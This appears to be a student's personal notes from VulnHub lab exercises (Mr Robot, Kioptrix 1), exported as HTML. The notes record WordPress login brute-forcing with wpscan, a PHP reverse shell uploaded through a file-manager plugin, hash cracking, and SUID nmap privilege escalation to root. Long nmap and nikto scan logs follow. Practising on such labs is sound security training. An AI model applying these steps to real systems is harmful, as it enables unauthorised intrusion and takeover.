incorrect.’<br />I could not figure out how to use hydra for brute force so I used wpscan <br />wpscan --url <a href="http://dc-2">http://</a>192.168.11.250/wp-login.php --passwords fsocity.dic --usernames elliot<br />after for .... fucking ... ever... I got a match!! ER28–0652<br />When I edited the php files to add my shellcode, it would disappear so I had to come up with a new plan...<br />Plugins&gt;add new&gt;search plugins&gt;wp filemanager&gt;install now&gt; make sure it is activated and stuff...<br />now WP File Manager should be on the left pane.<br />navigate in the directory to wp-content&gt;uploads&gt; right click in pane&gt;upload files&gt;locate your php file and upload!<br />start your nc listener<br />&gt;right click on your upload&gt;get info and share&gt;ctrl click on the link&gt; enjoy your shell!!!<br /><br />privesc involved un-md5 hashing hashtoolkit.com<br />c3fcd3d76192e4007dfb496cca67e13b = abcdefghijklmnopqrstuvwxyz<br />now we are robot! (plus we can read key-2-of-3.txt)<br />find / -perm -4000 2&gt;/dev/null   found that the SUID bit was set for nmap<br />gtfobins set me in the right direction!<br />nmap --interactive<br />!sh<br />whoami<br />root!!!<br /><br /></div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>073403c8a58a1f80d943455fb30724b9        822c73956184f694993bede3eb39f959        04787ddef27c3dee1ee161b21670b4e4<br />elliot<br />ER28–0652<br /><br />c3fcd3d76192e4007dfb496cca67e13b<br />abcdefghijklmnopqrstuvwxyz<br /><br />822c73956184f694993bede3eb39f959</div><div class='page'><h1 class='title level-5'>nmap</h1><br/>Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-25 13:20 EDT<br />Nmap scan report for 192.168.11.252<br />Host is up (0.00040s latency).<br />Not shown: 65532 filtered ports<br />PORT    STATE  SERVICE  VERSION<br />22/tcp  closed ssh<br />80/tcp  open   http     Apache httpd<br />|_http-server-header: Apache<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />443/tcp open   ssl/http Apache httpd<br />|_http-server-header: Apache<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />| ssl-cert: Subject: commonName=<a href="http://www.example.com">www.example.com</a><br />| Not valid before: 2015-09-16T10:45:03<br />|_Not valid after:  2025-09-13T10:45:03<br />MAC Address: 00:0C:29:C2:1A:BC (VMware)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 119.07 seconds<br /></div><div class='page'><h1 class='title level-5'>dirsearch</h1><br/></div><div class='page'><h1 class='title level-6'>80</h1><br/></div><div class='page'><h1 class='title level-6'>443</h1><br/> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-25_14-32-54.log<br /><br />Target: http://192.168.11.252:443<br /><br />[14:32:54] Starting: <br />                                                                <br />Task Completed<br />root@kali:~/Desktop/Machines/VulnHub/MrRobot/TireFire# <br /><br /></div><div class='page'><h1 class='title level-5'>nikto</h1><br/></div><div class='page'><h1 class='title level-6'>80</h1><br/><br /></div><div class='page'><h1 class='title level-6'>443</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.252<br />+ Target Hostname:    192.168.11.252<br />+ Target Port:        443<br />---------------------------------------------------------------------------<br />+ SSL Info:        Subject:  /CN=www.example.com<br />                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384<br />                   Issuer:   /CN=www.example.com<br />+ Start Time:         2019-10-25 14:32:53 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.<br />+ The site uses SSL and Expect-CT header is not present.<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Retrieved x-powered-by header: PHP/5.5.29<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ The Content-Encoding header is set to &quot;deflate&quot; this may mean that the server is vulnerable to the BREACH attack.<br />+ Uncommon header &#39;tcn&#39; found, with contents: list<br />+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.html, index.php<br />+ Hostname &#39;192.168.11.252&#39; does not match certificate&#39;s names: www.example.com<br />+ OSVDB-3092: /admin/: This might be interesting...<br />+ Uncommon header &#39;link&#39; found, with contents: &lt;https://192.168.11.252/?p=23&gt;; rel=shortlink<br /><br /></div><div class='page'><h1 class='title level-3'>kioptrix</h1><br/></div><div class='page'><h1 class='title level-4'>Kioptrix 1</h1><br/>nmap  showed me that 22, 80, 111, 139, 443, 32768 were all open. <br />I picked this machine becasue it was a SMB test, so I started there<br />enum4linux told me DICK<br />straight up nothing useful<br />other people ran enum4linux and got the Samba version.<br />After research I concluded that an older version of enum4linux was able to diagnose the Samba version<br />no nmap scan was able to point me in the right direction either.<br />ASK BRIAN FOR ADVICE<br />life sucks and I hate everyone<br />owned it with samba, bruteforce to root<br /><a href="https://www.exploit-db.com/exploits/10">https://www.exploit-db.com/exploits/10</a></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-01 09:44 EDT<br />Nmap scan report for 192.168.11.5<br />Host is up (0.0034s latency).<br />Not shown: 65529 closed ports<br />PORT      STATE SERVICE     VERSION<br />22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)<br />| ssh-hostkey: <br />|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)<br />|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)<br />|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)<br />|_sshv1: Server supports SSHv1<br />80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b<br />|_http-title: Test Page for the Apache Web Server on Red Hat Linux<br />111/tcp   open  rpcbind     2 (RPC #100000)<br />| rpcinfo: <br />|   program version   port/proto  service<br />|   100000  2            111/tcp  rpcbind<br />|   100000  2            111/udp  rpcbind<br />|   100024  1          32768/tcp  status<br />|_  100024  1          32768/udp  status<br />139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)<br />443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b<br />|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b<br />|_http-title: 400 Bad Request<br />|_ssl-date: 2019-11-01T14:52:12+00:00; +1h07m26s from scanner time.<br />| sslv2: <br />|   SSLv2 supported<br />|   ciphers: <br />|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />|     SSL2_RC4_128_WITH_MD5<br />|     SSL2_RC4_64_WITH_MD5<br />|     SSL2_RC2_128_CBC_WITH_MD5<br />|     SSL2_RC4_128_EXPORT40_WITH_MD5<br />|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br />|_    SSL2_DES_64_CBC_WITH_MD5<br />32768/tcp open  status      1 (RPC #100024)<br />MAC Address: 00:0C:29:36:ED:2E (VMware)<br /><br />Host script results:<br />|_clock-skew: mean: 1h07m25s, deviation: 0s, median: 1h07m25s<br />|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br />|_smb2-time: Protocol negotiation failed (SMB2)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 551.43 seconds<br /></div><div class='page'><h1 class='title level-7'>quick</h1><br/>nmap 192.168.11.5<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-01 09:48 EDT<br />Nmap scan report for 192.168.11.5<br />Host is up (0.0048s latency).<br />Not shown: 994 closed ports<br />PORT      STATE SERVICE<br />22/tcp    open  ssh<br />80/tcp    open  http<br />111/tcp   open  rpcbind<br />139/tcp   open  netbios-ssn<br />443/tcp   open  https<br />32768/tcp open  filenet-tms<br />MAC Address: 00:0C:29:36:ED:2E (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds<br /></div><div class='page'><h1 class='title level-7'>smb vuln</h1><br/>PORT    STATE  SERVICE      REASON<br />139/tcp open   netbios-ssn  syn-ack ttl 64<br />445/tcp closed microsoft-ds reset ttl 255<br />MAC Address: 00:0C:29:36:ED:2E (VMware)<br /><br />Host script results:<br />| smb-vuln-cve2009-3103: <br />|   VULNERABLE:<br />|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)<br />|     State: VULNERABLE<br />|     IDs:  CVE:CVE-2009-3103<br />|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,<br />|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a<br />|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE<br />|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,<br />|           aka &quot;SMBv2 Negotiation Vulnerability.&quot;<br />|           <br />|     Disclosure date: 2009-09-08<br />|     References:<br />|       <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</a><br />|_      <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103">http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</a><br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]<br />|_smb-vuln-ms17-010: Could not connect to &#39;IPC$&#39;<br /><br />NSE: Script Post-scanning.<br />NSE: Starting runlevel 1 (of 1) scan.<br />Initiating NSE at 10:48<br />Completed NSE at 10:48, 0.00s elapsed<br />Read data files from: /usr/bin/../share/nmap<br />Nmap done: 1 IP address (1 host up) scanned in 5.39 seconds<br />           Raw packets sent: 3 (116B) | Rcvd: 3 (112B)<br /></div><div class='page'><h1 class='title level-7'>all vulns</h1><br/>root@kali:~/Desktop/Machines/VulnHub/Kioptrix_1# nmap -v -sV -p- --script vuln -T4 192.168.11.5<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-01 15:48 EDT<br />NSE: Loaded 145 scripts for scanning.<br />NSE: Script Pre-scanning.<br />Initiating NSE at 15:48<br />Completed NSE at 15:48, 10.00s elapsed<br />Initiating NSE at 15:48<br />Completed NSE at 15:48, 0.00s elapsed<br />Initiating ARP Ping Scan at 15:48<br />Scanning 192.168.11.5 [1 port]<br />Completed ARP Ping Scan at 15:48, 0.04s elapsed (1 total hosts)<br />Initiating Parallel DNS resolution of 1 host. at 15:48<br />Completed Parallel DNS resolution of 1 host. at 15:48, 0.03s elapsed<br />Initiating SYN Stealth Scan at 15:48<br />Scanning 192.168.11.5 [65535 ports]<br />Discovered open port 111/tcp on 192.168.11.5<br />Discovered open port 80/tcp on 192.168.11.5<br />Discovered open port 443/tcp on 192.168.11.5<br />Discovered open port 139/tcp on 192.168.11.5<br />Discovered open port 22/tcp on 192.168.11.5<br />Discovered open port 32768/tcp on 192.168.11.5<br />Completed SYN Stealth Scan at 15:49, 5.84s elapsed (65535 total ports)<br />Initiating Service scan at 15:49<br />Scanning 6 services on 192.168.11.5<br />Completed Service scan at 15:49, 14.02s elapsed (6 services on 1 host)<br />NSE: Script scanning 192.168.11.5.<br />Initiating NSE at 15:49<br />Completed NSE at 15:57, 491.81s elapsed<br />Initiating NSE at 15:57<br />Completed NSE at 15:57, 0.03s elapsed<br />Nmap scan report for 192.168.11.5<br />Host is up (0.0046s latency).<br />Not shown: 65529 closed ports<br />PORT      STATE SERVICE     VERSION<br />22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)<br />80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)<br />|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.<br />|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.<br />| http-enum: <br />|   /test.php: Test page<br />|   /icons/: Potentially interesting directory w/ listing on &#39;apache/1.3.20&#39;<br />|   /manual/: Potentially interesting directory w/ listing on &#39;apache/1.3.20&#39;<br />|_  /usage/: Potentially interesting folder<br />|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b<br />|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.<br />|_http-trace: TRACE is enabled<br />111/tcp   open  rpcbind     2 (RPC #100000)<br />| rpcinfo: <br />|   program version   port/proto  service<br />|   100000  2            111/tcp  rpcbind<br />|   100000  2            111/udp  rpcbind<br />|   100024  1          32768/tcp  status<br />|_  100024  1          32768/udp  status<br />139/tcp   open  netbios-ssn Samba smbd (workgroup: ecMYGROUP)<br />443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b<br />|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)<br />|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.<br />|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.<br />|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b<br />|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.<br />| ssl-ccs-injection: <br />|   VULNERABLE:<br />|   SSL/TLS MITM vulnerability (CCS Injection)<br />|     State: VULNERABLE<br />|     Risk factor: High<br />|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h<br />|       does not properly restrict processing of ChangeCipherSpec messages,<br />|       which allows man-in-the-middle attackers to trigger use of a zero<br />|       length master key in certain OpenSSL-to-OpenSSL communications, and<br />|       consequently hijack sessions or obtain sensitive information, via<br />|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.<br />|           <br />|     References:<br />|       <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</a><br />|       <a href="http://www.openssl.org/news/secadv_20140605.txt">http://www.openssl.org/news/secadv_20140605.txt</a><br />|_      <a href="http://www.cvedetails.com/cve/2014-0224">http://www.cvedetails.com/cve/2014-0224</a><br />| ssl-dh-params: <br />|   VULNERABLE:<br />|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)<br />|     State: VULNERABLE<br />|     IDs:  CVE:CVE-2015-4000  OSVDB:122331<br />|       The Transport Layer Security (TLS) protocol contains a flaw that is<br />|       triggered when handling Diffie-Hellman key exchanges defined with<br />|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker<br />|       to downgrade the security of a TLS session to 512-bit export-grade<br />|       cryptography, which is significantly weaker, allowing the attacker<br />|       to more easily break the encryption and monitor or tamper with<br />|       the encrypted stream.<br />|     Disclosure date: 2015-5-19<br />|     Check results:<br />|       EXPORT-GRADE DH GROUP 1<br />|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA<br />|             Modulus Type: Safe prime<br />|             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus<br />|             Modulus Length: 512<br />|             Generator Length: 8<br />|             Public Key Length: 512<br />|     References:<br />|       <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</a><br />|       <a href="http://osvdb.org/122331">http://osvdb.org/122331</a><br />|       <a href="https://weakdh.org">https://weakdh.org</a><br />|   <br />|   Diffie-Hellman Key Exchange Insufficient Group Strength<br />|     State: VULNERABLE<br />|       Transport Layer Security (TLS) services that use Diffie-Hellman groups<br />|       of insufficient strength, especially those using one of a few commonly<br />|       shared groups, may be susceptible to passive eavesdropping attacks.<br />|     Check results:<br />|       WEAK DH GROUP 1<br />|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA<br />|             Modulus Type: Safe prime<br />|             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus<br />|             Modulus Length: 1024<br />|             Generator Length: 8<br />|             Public Key Length: 1024<br />|     References:<br />|_      <a href="https://weakdh.org">https://weakdh.org</a><br />| ssl-poodle: <br />|   VULNERABLE:<br />|   SSL POODLE information leak<br />|     State: VULNERABLE<br />|     IDs:  CVE:CVE-2014-3566  OSVDB:113251<br />|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other<br />|           products, uses nondeterministic CBC padding, which makes it easier<br />|           for man-in-the-middle attackers to obtain cleartext data via a<br />|           padding-oracle attack, aka the &quot;POODLE&quot; issue.<br />|     Disclosure date: 2014-10-14<br />|     Check results:<br />|       TLS_RSA_WITH_3DES_EDE_CBC_SHA<br />|     References:<br />|       <a href="https://www.imperialviolet.org/2014/10/14/poodle.html">https://www.imperialviolet.org/2014/10/14/poodle.html</a><br />|       <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</a><br />|       <a href="https://www.openssl.org/~bodo/ssl-poodle.pdf">https://www.openssl.org/~bodo/ssl-poodle.pdf</a><br />|_      <a href="http://osvdb.org/113251">http://osvdb.org/113251</a><br />| sslv2-drown: <br />|   ciphers: <br />|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br />|     SSL2_RC4_128_EXPORT40_WITH_MD5<br />|     SSL2_RC4_64_WITH_MD5<br />|     SSL2_RC4_128_WITH_MD5<br />|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />|     SSL2_RC2_128_CBC_WITH_MD5<br />|     SSL2_DES_64_CBC_WITH_MD5<br />|   vulns: <br />|     CVE-2016-0703: <br />|       title: OpenSSL: Divide-and-conquer session key recovery in SSLv2<br />|       state: VULNERABLE<br />|       ids: <br />|         CVE:CVE-2016-0703<br />|       description: <br />|               The get_client_master_key function in s2_srvr.c in the SSLv2 implementation in<br />|       OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before<br />|       1.0.2a accepts a nonzero CLIENT-MASTER-KEY CLEAR-KEY-LENGTH value for an arbitrary<br />|       cipher, which allows man-in-the-middle attackers to determine the MASTER-KEY value<br />|       and decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA padding oracle, a<br />|       related issue to CVE-2016-0800.<br />|     <br />|       refs: <br />|         <a href="https://www.openssl.org/news/secadv/20160301.txt">https://www.openssl.org/news/secadv/20160301.txt</a><br />|         <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0703">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0703</a><br />|     CVE-2016-0800: <br />|       title: OpenSSL: Cross-protocol attack on TLS using SSLv2 (DROWN)<br />|       state: VULNERABLE<br />|       ids: <br />|         CVE:CVE-2016-0800<br />|       description: <br />|               The SSLv2 protocol, as used in OpenSSL before 1.0.1s and 1.0.2 before 1.0.2g and<br />|       other products, requires a server to send a ServerVerify message before establishing<br />|       that a client possesses certain plaintext RSA data, which makes it easier for remote<br />|       attackers to decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA padding<br />|       oracle, aka a &quot;DROWN&quot; attack.<br />|     <br />|       refs: <br />|         <a href="https://www.openssl.org/news/secadv/20160301.txt">https://www.openssl.org/news/secadv/20160301.txt</a><br />|_        <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0800">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0800</a><br />32768/tcp open  status      1 (RPC #100024)<br />MAC Address: 00:0C:29:36:ED:2E (VMware)<br /><br />Host script results:<br />|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]<br />| smb-vuln-cve2009-3103: <br />|   VULNERABLE:<br />|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)<br />|     State: VULNERABLE<br />|     IDs:  CVE:CVE-2009-3103<br />|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,<br />|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a<br />|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE<br />|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,<br />|           aka &quot;SMBv2 Negotiation Vulnerability.&quot;<br />|           <br />|     Disclosure date: 2009-09-08<br />|     References:<br />|       <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103">http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</a><br />|_      <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</a><br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]<br /><br />NSE: Script Post-scanning.<br />Initiating NSE at 15:57<br />Completed NSE at 15:57, 0.00s elapsed<br />Initiating NSE at 15:57<br />Completed NSE at 15:57, 0.00s elapsed<br />Read data files from: /usr/bin/../share/nmap<br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 522.22 seconds<br />           Raw packets sent: 65624 (2.887MB) | Rcvd: 65536 (2.621MB)<br />root@kali:~/Desktop/Machines/VulnHub/Kioptrix_1# <br /></div><div class='page'><h1 class='title level-6'>dirsearch 80</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.5:80">http://192.168.11.5:80</a> --simple-report dirsearchsimple_192.168.11.5:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-11-01_09-59-14.log<br /><br />Target: <a href="http://192.168.11.5:80">http://192.168.11.5:80</a><br /><br />[09:59:14] Starting: <br />[09:59:14] 403 -  272B  - /cgi-bin/<br />[09:59:14] 200 -    9KB - /icons/<br />[09:59:14] 403 -  268B  - /doc/<br />[09:59:15] 200 -   27B  - /test.php<br />[09:59:15] 200 -  643B  - /manual/<br />[09:59:17] 200 -    4KB - /usage/<br />[09:59:23] 200 -   17KB - /mrtg/<br /><br />Task Completed<br /></div><div class='page'><h1 class='title level-6'>dirsearch 443</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.5:443">http://192.168.11.5:443</a> --simple-report dirsearchsimple_192.168.11.5:443<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-11-01_09-59-20.log<br /><br />Target: <a href="http://192.168.11.5:443">http://192.168.11.5:443</a><br /><br />[09:59:20] Starting: <br />CTRL+C detected: Pausing threads, please wait...<br />[e]xit / [c]ontinue: e<br /><br />Canceled by the user<br /></div><div class='page'><h1 class='title level-6'>nikto 80</h1><br/>nikto -host <a href="http://192.168.11.5:80">http://192.168.11.5:80</a> | tee nikto_192.168.11.5:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.5<br />+ Target Hostname:    192.168.11.5<br />+ Target Port:        80<br />+ Start Time:         2019-11-01 09:51:20 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b<br />+ Server leaks inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.<br />+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)<br />+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.<br />+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header<br />+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE <br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.<br />+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.<br />+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.<br />+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082,">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082,</a> OSVDB-756.<br />+ ///etc/hosts: The server install allows reading of any system file by adding an extra &#39;/&#39; to the URL.<br />+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). <a href="http://www.cert.org/advisories/CA-2000-02.html.">http://www.cert.org/advisories/CA-2000-02.html.</a><br />+ OSVDB-3268: /manual/: Directory indexing found.<br />+ OSVDB-3092: /manual/: Web server manual found.<br />+ OSVDB-3268: /icons/: Directory indexing found.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ OSVDB-3092: /test.php: This might be interesting...<br />+ 8345 requests: 0 error(s) and 21 item(s) reported on remote host<br />+ End Time:           2019-11-01 09:51:55 (GMT-4) (35 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>nikto 443</h1><br/>nikto -host <a href="http://192.168.11.5:443">http://192.168.11.5:443</a> | tee nikto_192.168.11.5:443<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.5<br />+ Target Hostname:    192.168.11.5<br />+ Target Port:        443<br />+ Start Time:         2019-11-01 09:51:20 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.<br />+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)<br />+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.<br />+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header<br />+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.<br />+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.<br />+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.<br />+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082,">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082,</a> OSVDB-756.<br />+ ///etc/hosts: The server install allows reading of any system file by adding an extra &#39;/&#39; to the URL.<br />+ 7550 requests: 14 error(s) and 12 item(s) reported on remote host<br />+ End Time:           2019-11-01 09:51:52 (GMT-4) (32 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br 